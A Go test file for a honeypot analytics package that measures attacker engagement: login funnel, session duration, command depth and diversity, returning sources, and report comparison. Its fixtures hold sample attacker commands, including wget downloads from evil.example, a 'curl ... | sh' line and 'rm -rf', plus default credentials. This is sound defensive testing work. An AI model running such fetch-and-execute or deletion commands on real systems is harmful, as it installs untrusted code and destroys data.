package engagement

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"reflect"
	"strings"
	"testing"
	"time"
)

var t0 = time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)

const sha = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

// at returns a Cowrie-style event sec seconds after t0.
func at(sec float64, src, sid, typ string) Event {
	return Event{
		Time: t0.Add(time.Duration(sec * float64(time.Second))), Honeypot: "cowrie",
		SourceIP: src, SessionID: sid, Type: typ,
	}
}

func cmd(sec float64, src, sid, line string) Event {
	e := at(sec, src, sid, "cowrie.command.input")
	e.Command = line
	return e
}

func login(sec float64, src, sid, user, pass string) Event {
	e := at(sec, src, sid, "cowrie.login.success")
	e.Username, e.Password = user, pass
	return e
}

func compute(t *testing.T, opt Options, events ...Event) *Report {
	t.Helper()
	r, err := Compute("test", sliceSource(events), opt)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

func sliceSource(events []Event) Source {
	return func(emit func(Event) bool) error {
		for _, e := range events {
			if !emit(e) {
				break
			}
		}
		return nil
	}
}

// scenario is five Cowrie sessions whose metrics are worked out by hand in
// TestMetricsByHand.
func scenario() []Event {
	download := at(6, "1.1.1.1", "s1", "cowrie.session.file_download")
	download.URL, download.SHA256, download.TechniqueID = "http://evil.example/x.sh", sha, "T1105"
	uname := cmd(3, "1.1.1.1", "s1", "uname -a")
	uname.TechniqueID = "t1082"
	closed := at(104, "2.2.2.2", "s2", "cowrie.session.closed")
	closed.ReportedDuration = 7500 * time.Millisecond
	return []Event{
		// s1: logs in, two commands, a payload. 10 s.
		at(0, "1.1.1.1", "s1", "cowrie.session.connect"),
		at(1, "1.1.1.1", "s1", "cowrie.login.failed"),
		login(2, "1.1.1.1", "s1", "root", "root"),
		uname,
		cmd(5, "1.1.1.1", "s1", "wget   http://evil.example/x.sh"),
		download,
		at(10, "1.1.1.1", "s1", "cowrie.session.closed"),
		// s2: logs in, two probes, leaves. The honeypot states 7.5 s.
		at(100, "2.2.2.2", "s2", "cowrie.session.connect"),
		login(101, "2.2.2.2", "s2", "admin", "admin"),
		cmd(102, "2.2.2.2", "s2", "uname -a"),
		cmd(103, "2.2.2.2", "s2", "nproc"),
		closed,
		// s3: two failed logins. 4 s.
		at(200, "3.3.3.3", "s3", "cowrie.session.connect"),
		at(201, "3.3.3.3", "s3", "cowrie.login.failed"),
		at(203, "3.3.3.3", "s3", "cowrie.login.failed"),
		at(204, "3.3.3.3", "s3", "cowrie.session.closed"),
		// s4: connects only. 0 s.
		at(300, "4.4.4.4", "s4", "cowrie.session.connect"),
		// s5: the source of s2 again, exactly one hour after s2 ended. 2 s.
		at(3704, "2.2.2.2", "s5", "cowrie.session.connect"),
		login(3705, "2.2.2.2", "s5", "admin", "admin"),
		cmd(3706, "2.2.2.2", "s5", "LC_ALL=C sudo /usr/bin/Wget http://evil.example/y"),
	}
}

func TestMetricsByHand(t *testing.T) {
	r := compute(t, Options{}, scenario()...)
	m := r.Overall

	if m.Sessions != 5 {
		t.Fatalf("sessions = %d, want 5", m.Sessions)
	}
	wantFunnel := Funnel{
		LoginAttempted: Stage{4, 80}, LoggedIn: Stage{3, 60}, Interactive: Stage{3, 60}, Payload: Stage{1, 20},
	}
	if m.Funnel != wantFunnel {
		t.Errorf("funnel = %+v, want %+v", m.Funnel, wantFunnel)
	}
	// All sessions: 0, 2, 4, 7.5, 10. Logged in: 2, 7.5, 10.
	wantDur := Durations{
		All:      DurationStats{Sessions: 5, MedianSeconds: 4, P90Seconds: 10, MaxSeconds: 10, TotalSeconds: 23.5},
		LoggedIn: DurationStats{Sessions: 3, MedianSeconds: 7.5, P90Seconds: 10, MaxSeconds: 10, TotalSeconds: 19.5},
		Reported: 1,
	}
	if m.Duration != wantDur {
		t.Errorf("duration = %+v, want %+v", m.Duration, wantDur)
	}
	// Commands per interactive session: 1, 2, 2.
	wantDepth := Depth{InteractiveSessions: 3, Median: 2, P90: 2, Max: 2, Total: 5}
	if m.Depth != wantDepth {
		t.Errorf("depth = %+v, want %+v", m.Depth, wantDepth)
	}
	// Stems: uname 2, wget 2, nproc 1. H = 2*0.4*log2(2.5) + 0.2*log2(5).
	wantDiv := Diversity{DistinctCommands: 4, PerSessionMedian: 2, StemEntropyBits: 1.5219, DistinctStems: 3}
	if m.Diversity != wantDiv {
		t.Errorf("diversity = %+v, want %+v", m.Diversity, wantDiv)
	}
	wantTop := []StemCount{{"uname", 2}, {"wget", 2}, {"nproc", 1}}
	if !reflect.DeepEqual(m.TopStems, wantTop) {
		t.Errorf("top stems = %v, want %v", m.TopStems, wantTop)
	}
	if want := (Stage{1, 33.33}); m.LeftAfterProbe != want {
		t.Errorf("left after a probe = %+v, want %+v", m.LeftAfterProbe, want)
	}
	if want := (Returning{InteractiveSources: 2, Returned: 1, Percent: 50}); m.Returning != want {
		t.Errorf("returning = %+v, want %+v", m.Returning, want)
	}
	wantIntel := Intelligence{
		PayloadHashes:   Distinct{Count: 1, Per1000: 200},
		DownloadURLs:    Distinct{Count: 1, Per1000: 200},
		DownloadHosts:   Distinct{Count: 1, Per1000: 200},
		CredentialPairs: Distinct{Count: 2, Per1000: 400},
		Techniques:      Distinct{Count: 2, Per1000: 400},
	}
	if m.Intelligence != wantIntel {
		t.Errorf("intelligence = %+v, want %+v", m.Intelligence, wantIntel)
	}

	if len(r.Honeypots) != 1 || r.Honeypots[0].Honeypot != "cowrie" || !reflect.DeepEqual(r.Honeypots[0].Metrics, m) {
		t.Errorf("the only honeypot must equal the overall metrics: %+v", r.Honeypots)
	}
	if want := (Input{Events: 20, Used: 20}); r.Input != want {
		t.Errorf("input = %+v, want %+v", r.Input, want)
	}
	if !r.Window.First.Equal(t0) || !r.Window.Last.Equal(t0.Add(3706*time.Second)) {
		t.Errorf("window = %+v", r.Window)
	}
	if len(r.Notes) != 0 {
		t.Errorf("no limit was reached, notes = %v", r.Notes)
	}
}

func TestFunnelCountsEventKinds(t *testing.T) {
	failed := at(1, "1.1.1.1", "a", "cowrie.session.file_download.failed")
	failed.URL = "http://one.example/a"
	upload := at(1, "1.1.1.1", "b", "cowrie.session.file_upload")
	upload.SHA256 = strings.ToUpper(sha)
	ttylog := at(1, "1.1.1.1", "c", "cowrie.log.closed")
	ttylog.SHA256 = strings.Replace(sha, "a", "b", 1)
	repeated := cmd(1, "1.1.1.1", "d", "nosuchtool")
	repeated.Type = "cowrie.command.failed"
	backend := cmd(1, "1.1.1.1", "e", "id")
	backend.Type, backend.Honeypot = "ssh-proxy.command.start", "ssh-proxy"
	finish := backend
	finish.Type = "ssh-proxy.command.finish"
	empty := cmd(1, "1.1.1.1", "f", "   ")
	auth := at(1, "1.1.1.1", "g", "refrigeration.auth.success")

	m := compute(t, Options{}, failed, upload, ttylog, repeated, backend, finish, empty, auth).Overall
	if m.Sessions != 7 {
		t.Fatalf("sessions = %d, want 7", m.Sessions)
	}
	// A failed download gives a URL and no payload; an upload is a payload.
	if m.Funnel.Payload.Count != 1 || m.Intelligence.DownloadURLs.Count != 1 || m.Intelligence.DownloadHosts.Count != 1 {
		t.Errorf("payload stage %+v, urls %+v", m.Funnel.Payload, m.Intelligence.DownloadURLs)
	}
	// The TTY recording's hash is not a payload hash.
	if m.Intelligence.PayloadHashes.Count != 1 {
		t.Errorf("payload hashes = %d, want 1", m.Intelligence.PayloadHashes.Count)
	}
	// command.failed and command.finish repeat a line; a blank line is none.
	if m.Funnel.Interactive.Count != 1 || m.Depth.Total != 1 {
		t.Errorf("interactive %+v, commands %d, want 1 and 1", m.Funnel.Interactive, m.Depth.Total)
	}
	if m.Funnel.LoggedIn.Count != 1 || m.Funnel.LoginAttempted.Count != 1 {
		t.Errorf("logins: %+v", m.Funnel)
	}
}

func TestEventsWithoutTimeOrKey(t *testing.T) {
	noTime := at(0, "1.1.1.1", "a", "cowrie.session.connect")
	noTime.Time = time.Time{}
	noKey := at(0, "", " ", "cowrie.session.connect")
	r := compute(t, Options{}, noTime, noKey, at(5, "1.1.1.1", "a", "cowrie.session.connect"))
	want := Input{Events: 3, Used: 1, WithoutTime: 1, WithoutSessionKey: 1}
	if r.Input != want || r.Overall.Sessions != 1 {
		t.Errorf("input = %+v sessions = %d, want %+v and 1", r.Input, r.Overall.Sessions, want)
	}
}

func TestDurationPercentiles(t *testing.T) {
	// Ten sessions of 1..10 s: median (5+6)/2, p90 = 9th value, total 55.
	var events []Event
	for i := 1; i <= 10; i++ {
		sid := fmt.Sprint("s", i)
		events = append(events, at(0, "1.1.1.1", sid, "cowrie.session.connect"), at(float64(i), "1.1.1.1", sid, "cowrie.session.closed"))
	}
	got := compute(t, Options{}, events...).Overall.Duration.All
	want := DurationStats{Sessions: 10, MedianSeconds: 5.5, P90Seconds: 9, MaxSeconds: 10, TotalSeconds: 55}
	if got != want {
		t.Errorf("got %+v, want %+v", got, want)
	}
	if got := p90([]int64{7}); got != 7 {
		t.Errorf("p90 of one value = %d", got)
	}
	if got := p90([]int64{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}); got != 10 {
		t.Errorf("p90 of 1..11 = %d, want 10", got)
	}
}

func TestSessionsBySourceAndGap(t *testing.T) {
	src := func(sec float64, typ string) Event {
		e := at(sec, "9.9.9.9", "", typ)
		e.Honeypot = "dionaea"
		return e
	}
	gap := SessionGap.Seconds()
	cases := []struct {
		name   string
		events []Event
		want   int64
	}{
		{"one event", []Event{src(0, "x")}, 1},
		{"exactly the gap apart is one session", []Event{src(0, "x"), src(gap, "x")}, 1},
		{"a microsecond more than the gap is two", []Event{src(0, "x"), src(gap+0.000001, "x")}, 2},
		{"a chain of gaps is one session", []Event{src(0, "x"), src(gap, "x"), src(2*gap, "x")}, 1},
		{"an event in the middle joins two runs", []Event{src(0, "x"), src(3000, "x"), src(1500, "x")}, 1},
		{"three runs", []Event{src(0, "x"), src(4000, "x"), src(8000, "x")}, 3},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := compute(t, Options{}, tc.events...).Overall.Sessions; got != tc.want {
				t.Errorf("sessions = %d, want %d", got, tc.want)
			}
		})
	}

	// A session id wins over the source; another honeypot or another source
	// is another session.
	other := src(10, "x")
	other.Honeypot = "heralding"
	otherSrc := src(10, "x")
	otherSrc.SourceIP = "8.8.8.8"
	r := compute(t, Options{}, src(0, "x"), src(10, "x"), other, otherSrc,
		at(20, "9.9.9.9", "id1", "cowrie.session.connect"), at(5000, "9.9.9.9", "id1", "cowrie.session.closed"))
	if r.Overall.Sessions != 4 {
		t.Errorf("sessions = %d, want 4", r.Overall.Sessions)
	}
	byName := map[string]int64{}
	for _, h := range r.Honeypots {
		byName[h.Honeypot] = h.Sessions
	}
	if want := map[string]int64{"cowrie": 1, "dionaea": 2, "heralding": 1}; !reflect.DeepEqual(byName, want) {
		t.Errorf("per honeypot = %v, want %v", byName, want)
	}
	// The session with an id lasts from its first to its last event, however
	// long the quiet time between them.
	if got := r.Honeypots[0].Duration.All.MaxSeconds; got != 4980 {
		t.Errorf("cowrie session = %v s, want 4980", got)
	}
}

func TestMergedRunsKeepTheirCommands(t *testing.T) {
	c := func(sec float64, line string) Event {
		e := cmd(sec, "9.9.9.9", "", line)
		e.Type = "adbhoney.command.input"
		e.Honeypot = "adbhoney"
		return e
	}
	// Two runs, then an event that joins them: 3 commands, last one "wget".
	m := compute(t, Options{}, c(0, "id"), c(3000, "wget http://h.example/a"), c(1500, "uname")).Overall
	if m.Sessions != 1 || m.Depth.Max != 3 || m.Diversity.PerSessionMedian != 3 || m.LeftAfterProbe.Count != 0 {
		t.Errorf("merged session: %+v", m)
	}
}

func TestLeftAfterProbe(t *testing.T) {
	type session struct {
		lines   []string
		payload bool
	}
	cases := []struct {
		name string
		s    session
		want int64
	}{
		{"one probe", session{lines: []string{"uname -a"}}, 1},
		{"three commands ending in a probe", session{lines: []string{"cd /tmp", "wget http://h.example/a", "cat /proc/cpuinfo | grep name | wc -l"}}, 1},
		{"four commands", session{lines: []string{"id", "id", "id", "whoami"}}, 0},
		{"last command is not a probe", session{lines: []string{"uname -a", "wget http://h.example/a"}}, 0},
		{"ls without a payload", session{lines: []string{"ls -la"}}, 1},
		{"ls after a payload", session{lines: []string{"ls -la"}, payload: true}, 0},
		{"probe after a payload still counts", session{lines: []string{"uname -a"}, payload: true}, 1},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var events []Event
			for i, line := range tc.s.lines {
				events = append(events, cmd(float64(i), "1.1.1.1", "s", line))
			}
			if tc.s.payload {
				events = append(events, at(0, "1.1.1.1", "s", "cowrie.session.file_download"))
			}
			if got := compute(t, Options{}, events...).Overall.LeftAfterProbe.Count; got != tc.want {
				t.Errorf("left after a probe = %d, want %d", got, tc.want)
			}
		})
	}

	// Two commands at the same instant: both must be probes.
	tie := compute(t, Options{}, cmd(1, "1.1.1.1", "s", "uname"), cmd(1, "1.1.1.1", "s", "rm -rf /tmp/x")).Overall
	if tie.LeftAfterProbe.Count != 0 {
		t.Errorf("a tie with a command that is not a probe counted as a probe")
	}
}

func TestReturningSources(t *testing.T) {
	hour := ReturnAfter.Seconds()
	cases := []struct {
		name   string
		events []Event
		want   Returning
	}{
		{"back after exactly an hour", []Event{
			cmd(0, "1.1.1.1", "a", "id"), cmd(10, "1.1.1.1", "a", "id"), at(10+hour, "1.1.1.1", "b", "cowrie.session.connect"),
		}, Returning{1, 1, 100}},
		{"back a second too soon", []Event{
			cmd(0, "1.1.1.1", "a", "id"), cmd(10, "1.1.1.1", "a", "id"), at(9+hour, "1.1.1.1", "b", "cowrie.session.connect"),
		}, Returning{1, 0, 0}},
		{"never interactive", []Event{
			at(0, "1.1.1.1", "a", "cowrie.session.connect"), at(2*hour, "1.1.1.1", "b", "cowrie.session.connect"),
		}, Returning{0, 0, 0}},
		{"the earlier session was not the interactive one", []Event{
			at(0, "1.1.1.1", "a", "cowrie.session.connect"), cmd(2*hour, "1.1.1.1", "b", "id"),
		}, Returning{1, 0, 0}},
		{"another source does not count", []Event{
			cmd(0, "1.1.1.1", "a", "id"), cmd(2*hour, "2.2.2.2", "b", "id"),
		}, Returning{2, 0, 0}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := compute(t, Options{}, tc.events...).Overall.Returning; got != tc.want {
				t.Errorf("returning = %+v, want %+v", got, tc.want)
			}
		})
	}
}

func TestLimits(t *testing.T) {
	t.Run("distinct commands", func(t *testing.T) {
		var events []Event
		for i := 0; i < 10; i++ {
			events = append(events, cmd(float64(i), "1.1.1.1", "s", fmt.Sprint("tool", i)))
		}
		r := compute(t, Options{DistinctLimit: 3}, events...)
		d := r.Overall.Diversity
		if d.DistinctCommands != 3 || !d.DistinctCommandsReached {
			t.Errorf("diversity = %+v, want 3 and reached", d)
		}
		if len(r.Notes) != 2 || !strings.Contains(r.Notes[0], "all honeypots: distinct commands reached the limit of 3") || !strings.Contains(r.Notes[1], "cowrie: distinct commands") {
			t.Errorf("notes = %q", r.Notes)
		}
	})
	t.Run("stems", func(t *testing.T) {
		// a 5, b 3, c 1, d 1 with room for two stems: a and b are kept with
		// exact counts, c and d count as one stem of 2 in the entropy.
		var events []Event
		for i, line := range strings.Fields("c a a b a d b a b a") {
			events = append(events, cmd(float64(i), "1.1.1.1", "s", line))
		}
		r := compute(t, Options{StemLimit: 2}, events...)
		d := r.Overall.Diversity
		if d.DistinctStems != 2 || !d.StemsReached || d.StemEntropyBits != 1.4855 {
			t.Errorf("diversity = %+v", d)
		}
		if want := []StemCount{{"a", 5}, {"b", 3}}; !reflect.DeepEqual(r.Overall.TopStems, want) {
			t.Errorf("top stems = %v, want %v", r.Overall.TopStems, want)
		}
	})
	t.Run("commands per session", func(t *testing.T) {
		r := compute(t, Options{SessionCommandLimit: 2},
			cmd(0, "1.1.1.1", "s", "a"), cmd(1, "1.1.1.1", "s", "b"), cmd(2, "1.1.1.1", "s", "c"), cmd(3, "1.1.1.1", "s", "c"))
		d := r.Overall.Diversity
		if d.PerSessionMedian != 2 || d.PerSessionReached != 1 || r.Overall.Depth.Max != 4 {
			t.Errorf("diversity = %+v depth = %+v", d, r.Overall.Depth)
		}
	})
	t.Run("sessions", func(t *testing.T) {
		var events []Event
		for i := 0; i < 9; i++ {
			sid := fmt.Sprint("s", i)
			events = append(events, at(float64(i), "1.1.1.1", sid, "cowrie.session.connect"), cmd(float64(i)+1, "1.1.1.1", sid, sid))
		}
		r := compute(t, Options{SessionLimit: 2}, events...)
		if r.Overall.Sessions != 2 || !r.Limits.SessionsReached {
			t.Errorf("sessions = %d reached = %v, want 2 and true", r.Overall.Sessions, r.Limits.SessionsReached)
		}
		if r.Input.OutsideSessionSample != 14 {
			t.Errorf("events outside the sample = %d, want 14 of 18", r.Input.OutsideSessionSample)
		}
		// Every event still counts for the diversity figures.
		if r.Overall.Diversity.DistinctCommands != 9 {
			t.Errorf("distinct commands = %d, want 9", r.Overall.Diversity.DistinctCommands)
		}
		// The two kept sessions are whole: each has its connect and command.
		if r.Overall.Funnel.Interactive.Count != 2 || r.Overall.Duration.All.TotalSeconds != 2 {
			t.Errorf("kept sessions are not whole: %+v", r.Overall)
		}
		if len(r.Notes) == 0 || !strings.Contains(r.Notes[0], "fixed sample of 2 keys") {
			t.Errorf("notes = %q", r.Notes)
		}
	})
}

func TestCappedKeepsTheSmallestWithExactCounts(t *testing.T) {
	rng := rand.New(rand.NewSource(7))
	keys := make([]uint64, 0, 600)
	want := map[uint64]int64{}
	for k := uint64(1); k <= 200; k++ {
		for n := int64(0); n < int64(k%3)+1; n++ {
			keys = append(keys, k)
		}
		if k <= 10 {
			want[k] = int64(k%3) + 1
		}
	}
	for round := 0; round < 20; round++ {
		rng.Shuffle(len(keys), func(i, j int) { keys[i], keys[j] = keys[j], keys[i] })
		c := newCapped[uint64, int64](10, lessUint64)
		for _, k := range keys {
			if n := c.slot(k); n != nil {
				*n++
			}
			if len(c.m) > 20 {
				t.Fatalf("holds %d keys, more than twice the limit", len(c.m))
			}
		}
		c.finish()
		got := map[uint64]int64{}
		for k, n := range c.m {
			got[k] = *n
		}
		if !reflect.DeepEqual(got, want) || !c.over {
			t.Fatalf("round %d: got %v over=%v, want %v", round, got, c.over, want)
		}
	}
	small := newCapped[uint64, int64](10, lessUint64)
	for k := uint64(0); k < 10; k++ {
		small.slot(k)
	}
	small.finish()
	if small.over || len(small.m) != 10 {
		t.Errorf("exactly the limit must not report it as reached")
	}
}

// randomEvents builds a stream with session ids, sessions by source, equal
// timestamps and every event kind.
func randomEvents(rng *rand.Rand, n int) []Event {
	honeypots := []string{"cowrie", "adbhoney", "dionaea"}
	lines := []string{"uname -a", "id", "ls", "wget http://a.example/x", "cat /proc/cpuinfo", "echo ok", "rm -rf x", "busybox ECCHI", "curl http://b.example/y | sh", "nproc"}
	types := []string{".session.connect", ".login.failed", ".login.success", ".command.input", ".command.input", ".session.file_download", ".session.file_download.failed", ".session.closed"}
	events := make([]Event, 0, n)
	for i := 0; i < n; i++ {
		hp := honeypots[rng.Intn(len(honeypots))]
		e := Event{
			Time:     t0.Add(time.Duration(rng.Intn(400)) * 5 * time.Minute),
			Honeypot: hp,
			SourceIP: fmt.Sprintf("10.0.0.%d", rng.Intn(12)),
			Type:     hp + types[rng.Intn(len(types))],
		}
		if hp != "dionaea" && rng.Intn(4) > 0 {
			e.SessionID = fmt.Sprintf("sid%d", rng.Intn(40))
		}
		switch {
		case strings.HasSuffix(e.Type, ".command.input"):
			e.Command = lines[rng.Intn(len(lines))]
			e.TechniqueID = fmt.Sprintf("T%d", 1000+rng.Intn(5))
		case strings.HasSuffix(e.Type, ".login.success"):
			e.Username, e.Password = "root", fmt.Sprint("pw", rng.Intn(6))
		case strings.Contains(e.Type, "file_download"):
			e.URL = fmt.Sprintf("http://h%d.example/p%d", rng.Intn(4), rng.Intn(9))
			e.SHA256 = strings.Repeat(fmt.Sprint(rng.Intn(8)), 64)
		case strings.HasSuffix(e.Type, ".session.closed"):
			e.ReportedDuration = time.Duration(rng.Intn(900)) * time.Second
		}
		events = append(events, e)
	}
	return events
}

func TestReportDoesNotDependOnEventOrder(t *testing.T) {
	limits := map[string]Options{
		"default limits": {},
		"limits reached": {DistinctLimit: 4, StemLimit: 3, SessionCommandLimit: 2, SessionLimit: 25, SampleLimit: 7, SourceLimit: 5},
	}
	for name, opt := range limits {
		t.Run(name, func(t *testing.T) {
			rng := rand.New(rand.NewSource(42))
			events := randomEvents(rng, 3000)
			want := compute(t, opt, events...)
			if name == "limits reached" && (!want.Limits.SessionsReached || !want.Limits.SampleReached || !want.Limits.PairedSourcesReached || len(want.Notes) < 6) {
				t.Fatalf("the small limits were not reached: %+v %q", want.Limits, want.Notes)
			}
			if want.Overall.Sessions == 0 || want.Overall.Returning.InteractiveSources == 0 || want.Overall.LeftAfterProbe.Count == 0 {
				t.Fatalf("the stream does not exercise the metrics: %+v", want.Overall)
			}
			for round := 0; round < 15; round++ {
				rng.Shuffle(len(events), func(i, j int) { events[i], events[j] = events[j], events[i] })
				got := compute(t, opt, events...)
				if !reflect.DeepEqual(got, want) {
					a, _ := json.Marshal(want)
					b, _ := json.Marshal(got)
					t.Fatalf("round %d: the report changed with the order of events\nfirst: %s\nthen:  %s", round, a, b)
				}
			}
		})
	}
}

func TestCompare(t *testing.T) {
	a := *compute(t, Options{}, scenario()...)
	a.Label = "qpot"
	// b: one session that logs in and runs four commands, the last a probe.
	b := *compute(t, Options{},
		login(0, "5.5.5.5", "x", "root", "1234"),
		cmd(1, "5.5.5.5", "x", "a"), cmd(2, "5.5.5.5", "x", "b"), cmd(3, "5.5.5.5", "x", "c"), cmd(4, "5.5.5.5", "x", "uname"))
	b.Label = "stock"
	c := Compare(a, b)
	if c.A != "qpot" || c.B != "stock" || len(c.Deltas) != len(Definitions()) {
		t.Fatalf("comparison = %+v", c)
	}
	byKey := map[string]Delta{}
	for _, d := range c.Deltas {
		byKey[d.Key] = d
	}
	check := func(key string, wantDiff float64, wantFavours string) {
		t.Helper()
		d, ok := byKey[key]
		if !ok || !d.Defined || d.Difference != wantDiff || d.Favours != wantFavours {
			t.Errorf("%s = %+v, want difference %v favouring %q", key, d, wantDiff, wantFavours)
		}
	}
	check("sessions", -4, "")                  // no direction
	check("logged_in_pct", 40, "b")            // 60 -> 100, higher is better
	check("depth_median", 2, "b")              // 2 -> 4
	check("left_after_probe_pct", -33.33, "b") // 33.33 -> 0, lower is better
	check("payload_pct", -20, "a")             // 20 -> 0
	check("duration_logged_in_median_s", -3.5, "a")
	check("stem_entropy_bits", 0.4781, "b") // 1.5219 -> 2
	check("returning_sources_pct", -50, "a")
	check("interactive_pct", 40, "b")

	// A metric without a base in one report is not compared.
	empty := *compute(t, Options{})
	d := Compare(a, empty).Deltas
	for _, x := range d {
		if x.Key == "depth_median" && (x.Defined || x.Favours != "" || x.Difference != 0) {
			t.Errorf("depth of an empty report was compared: %+v", x)
		}
	}
	equal := Compare(a, a)
	for _, x := range equal.Deltas {
		if x.Better != NoDirection && x.Defined && x.Favours != "equal" {
			t.Errorf("%s of a report against itself favours %q", x.Key, x.Favours)
		}
	}
}

func TestWriteText(t *testing.T) {
	a := compute(t, Options{DistinctLimit: 2}, scenario()...)
	a.Label = "sensor1"
	extra := cmd(0, "7.7.7.7", "", "id")
	extra.Honeypot, extra.Type = "adbhoney", "adbhoney.command.input"
	b := compute(t, Options{}, append(scenario(), extra)...)
	b.Label = "stock"
	b.Input.Log = &LogStats{Lines: 25, Malformed: 2, Oversized: 1}

	var one, two, three bytes.Buffer
	if err := WriteText(&one, []*Report{a}); err != nil {
		t.Fatal(err)
	}
	if err := WriteText(&two, []*Report{a, b}); err != nil {
		t.Fatal(err)
	}
	if err := WriteText(&three, []*Report{a, b, a}); err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"METRIC", "SENSOR1", "BETTER", "Left after a probe", "33.3%", "lower", "Top command stems: uname (2), wget (2), nproc (1)", "Note: all honeypots: distinct commands reached the limit of 2"} {
		if !strings.Contains(one.String(), want) {
			t.Errorf("one report: %q is missing from\n%s", want, one.String())
		}
	}
	if strings.Contains(one.String(), "DIFFERENCE") || strings.Contains(three.String(), "DIFFERENCE") {
		t.Errorf("the difference column belongs to exactly two reports")
	}
	for _, want := range []string{"DIFFERENCE", "STOCK", "+1", "Log lines: 25 read, 2 malformed, 1 too long", "Per honeypot:", "adbhoney", "Duration stated by the honeypot for 1 of 6 sessions"} {
		if !strings.Contains(two.String(), want) {
			t.Errorf("two reports: %q is missing from\n%s", want, two.String())
		}
	}
	var none bytes.Buffer
	if err := WriteText(&none, nil); err != nil || none.Len() != 0 {
		t.Errorf("no reports must print nothing")
	}
}
